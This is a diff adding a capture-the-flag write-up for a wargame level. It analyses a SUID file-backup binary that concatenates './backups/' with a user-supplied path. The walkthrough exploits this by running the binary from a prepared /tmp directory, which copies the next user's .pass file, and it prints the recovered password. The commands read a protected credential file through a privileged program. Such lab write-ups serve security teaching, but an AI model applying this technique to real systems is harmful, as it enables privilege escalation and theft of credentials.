@@ -1,1 +1,187 @@
-hello flag
+# Level08 — Path Traversal & Backup Directory Manipulation
+
+## Context
+
+Inside the home directory of the `level08` user, we find a binary named `level08`.
+The program implements a file backup utility that reads a specified file and creates a backup copy in a `backups/` directory.
+Our objective is to exploit the program's path handling logic to read restricted files by manipulating the backup directory structure.
+
+---
+
+## Initial Environment — Directory Listing
+
+```bash
+$ ls -la
+total 17
+dr-xr-x---+ 1 level09 level09   80 Oct  2  2016 .
+dr-x--x--x  1 root    root     260 Oct  2  2016 ..
+-rw-r--r--  1 level09 level09  220 Sep 10  2016 .bash_logout
+lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
+-rw-r--r--  1 level08 level08 3533 Sep 10  2016 .bashrc
+-rwsr-s---+ 1 level09 users   12975 Sep 10  2016 level08
+-rw-r--r--  1 level09 level09  675 Sep 10  2016 .profile
+```
+
+> **Note:** the binary `level08` has the **SUID** bit set (`rws`), so it runs with the privileges of its owner (`level09`).
+
+---
+
+## Security Analysis
+
+```bash
+$ checksec --file ./level08
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Full RELRO      Canary found      NX disabled   No PIE          No RPATH   No RUNPATH   ./level08
+```
+
+**Key security features:**
+* **Full RELRO** → GOT is read-only, no GOT overwrite attacks
+* **Stack canary** → Stack buffer overflow protection enabled
+* **NX disabled** → Stack is executable (though not directly exploitable here)
+* **No PIE** → Predictable memory addresses
+
+---
+
+## Running the Binary
+
+```bash
+$ ./level08
+Usage: ./level08 filename
+
+$ ./level08 /etc/passwd
+ERROR: Failed to open /etc/passwd
+
+$ ./level08 test.txt
+ERROR: Failed to open test.txt
+```
+
+The program requires a filename argument and attempts to open the specified file.
+
+---
+
+## Static Analysis (Disassembly)
+
+**Program Flow Analysis:**
+
+### Argument Validation
+```asm
+0x400a22 <+50>:    cmp    DWORD PTR [rbp-0x94],0x2  ; Check argc == 2
+0x400a29 <+57>:    je     0x400a4a <main+90>        ; Jump if valid args
+```
+
+### Log File Operations
+```asm
+0x400a4f <+95>:    mov    eax,0x400d6d              ; "./backups/.log"
+0x400a5a <+106>:   call   0x4007c0 <fopen@plt>     ; Open log file
+0x400aae <+190>:   call   0x4008c4 <log_wrapper>   ; Log file access attempt
+```
+
+### Target File Operations
+```asm
+0x400ab8 <+200>:   mov    eax,QWORD PTR [rbp-0xa0]  ; argv
+0x400ac3 <+211>:   mov    rax,QWORD PTR [rax]       ; argv[1] (filename)
+0x400acc <+220>:   call   0x4007c0 <fopen@plt>     ; Open target file
+```
+
+### Backup Path Construction
+```asm
+0x400b0e <+286>:   lea    rax,[rbp-0x70]            ; Backup path buffer
+0x400b12 <+290>:   mov    rcx,QWORD PTR [rdx]       ; Copy "./backups/"
+0x400b7d <+397>:   call   0x400750 <strncat@plt>   ; Concatenate filename
+0x400b98 <+424>:   call   0x4007b0 <open@plt>      ; Create backup file
+```
+
+### File Copy Loop
+```asm
+0x400bf5 <+517>:   call   0x400760 <fgetc@plt>     ; Read byte from source
+0x400be6 <+502>:   call   0x400700 <write@plt>     ; Write byte to backup
+```
+
+**Critical observations:**
+* Program opens `./backups/.log` for logging
+* Target file is opened for reading
+* Backup path is constructed as `./backups/` + filename
+* File contents are copied byte-by-byte to backup location
+
+---
+
+## Vulnerability Analysis
+
+### Path Construction Logic
+
+The program constructs backup paths by simple concatenation:
+```c
+// Simplified logic
+strcpy(backup_path, "./backups/");
+strncat(backup_path, argv[1], remaining_space);
+```
+
+**Key vulnerability:** No path sanitization or validation.
+
+### Path Traversal Discovery
+
+Testing various file access attempts:
+
+```bash
+$ ./level08 /home/users/level09/.pass
+ERROR: Failed to open /home/users/level09/.pass
+```
+
+The program cannot directly access restricted files due to insufficient privileges.
+
+---
+
+## Exploitation Strategy
+
+### Step 1: Understanding the Backup Mechanism
+
+The program creates backups in `./backups/filename`. If we can control where this backup is created, we can potentially:
+1. Read files we have access to as level08
+2. Create the backup in a location we can access
+3. Use directory traversal to manipulate the backup path
+
+### Step 2: Directory Structure Manipulation
+
+Create a directory structure that allows path traversal:
+
+```bash
+$ cd /tmp/
+$ mkdir -p backups/home/users/level09/
+```
+
+This creates a path: `/tmp/backups/home/users/level09/`
+
+### Step 3: Relative Path Exploitation
+
+When we run the program with filename `/home/users/level09/.pass`, it will:
+1. Try to open `/home/users/level09/.pass` (this will work due to SUID)
+2. Create backup at `./backups/home/users/level09/.pass`
+3. Since we created the directory structure, the backup will be written there
+
+---
+
+## Exploitation
+
+### Execute from Controlled Directory
+
+```bash
+$ cd /tmp/
+$ mkdir -p backups/home/users/level09/
+$ ~/level08 /home/users/level09/.pass
+```
+
+**No error message indicates success!**
+
+### Verify Backup Creation
+
+```bash
+$ ls backups/
+home/  .log
+
+$ cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
+
+**Success:** Password extracted from the backup file!
+
+---
